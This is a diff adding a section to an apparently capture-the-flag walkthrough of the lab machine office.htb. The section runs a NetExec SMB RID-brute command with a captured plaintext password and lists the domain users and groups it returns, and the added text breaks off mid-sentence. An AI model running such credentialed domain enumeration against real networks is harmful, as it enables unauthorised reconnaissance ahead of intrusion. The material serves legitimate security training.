@@ -332,5 +332,43 @@ The user has no access on WINRM
 ## Dumping all the users
 
 ```python
-
+nxc smb dc.office.htb -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --rid-brute 20000
+SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:None)
+SMB         10.129.230.226  445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+SMB         10.129.230.226  445    DC               498: OFFICE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.230.226  445    DC               500: OFFICE\Administrator (SidTypeUser)
+SMB         10.129.230.226  445    DC               501: OFFICE\Guest (SidTypeUser)
+SMB         10.129.230.226  445    DC               502: OFFICE\krbtgt (SidTypeUser)
+SMB         10.129.230.226  445    DC               512: OFFICE\Domain Admins (SidTypeGroup)
+SMB         10.129.230.226  445    DC               513: OFFICE\Domain Users (SidTypeGroup)
+SMB         10.129.230.226  445    DC               514: OFFICE\Domain Guests (SidTypeGroup)
+SMB         10.129.230.226  445    DC               515: OFFICE\Domain Computers (SidTypeGroup)
+SMB         10.129.230.226  445    DC               516: OFFICE\Domain Controllers (SidTypeGroup)
+SMB         10.129.230.226  445    DC               517: OFFICE\Cert Publishers (SidTypeAlias)
+SMB         10.129.230.226  445    DC               518: OFFICE\Schema Admins (SidTypeGroup)
+SMB         10.129.230.226  445    DC               519: OFFICE\Enterprise Admins (SidTypeGroup)
+SMB         10.129.230.226  445    DC               520: OFFICE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.230.226  445    DC               521: OFFICE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.230.226  445    DC               522: OFFICE\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.230.226  445    DC               525: OFFICE\Protected Users (SidTypeGroup)
+SMB         10.129.230.226  445    DC               526: OFFICE\Key Admins (SidTypeGroup)
+SMB         10.129.230.226  445    DC               527: OFFICE\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.230.226  445    DC               553: OFFICE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.230.226  445    DC               571: OFFICE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.230.226  445    DC               572: OFFICE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.230.226  445    DC               1000: OFFICE\DC$ (SidTypeUser)
+SMB         10.129.230.226  445    DC               1101: OFFICE\DnsAdmins (SidTypeAlias)
+SMB         10.129.230.226  445    DC               1102: OFFICE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.230.226  445    DC               1106: OFFICE\Registry Editors (SidTypeGroup)
+SMB         10.129.230.226  445    DC               1107: OFFICE\PPotts (SidTypeUser)
+SMB         10.129.230.226  445    DC               1108: OFFICE\HHogan (SidTypeUser)
+SMB         10.129.230.226  445    DC               1109: OFFICE\EWhite (SidTypeUser)
+SMB         10.129.230.226  445    DC               1110: OFFICE\etower (SidTypeUser)
+SMB         10.129.230.226  445    DC               1111: OFFICE\dwolfe (SidTypeUser)
+SMB         10.129.230.226  445    DC               1112: OFFICE\dmichael (SidTypeUser)
+SMB         10.129.230.226  445    DC               1113: OFFICE\dlanor (SidTypeUser)
+SMB         10.129.230.226  445    DC               1114: OFFICE\tstark (SidTypeUser)
+SMB         10.129.230.226  445    DC               1117: OFFICE\GPO Managers (SidTypeGroup)
+SMB         10.129.230.226  445    DC               1118: OFFICE\web_account (SidTypeUser)
 ```
+Here are the users, ill adapt the command to append the
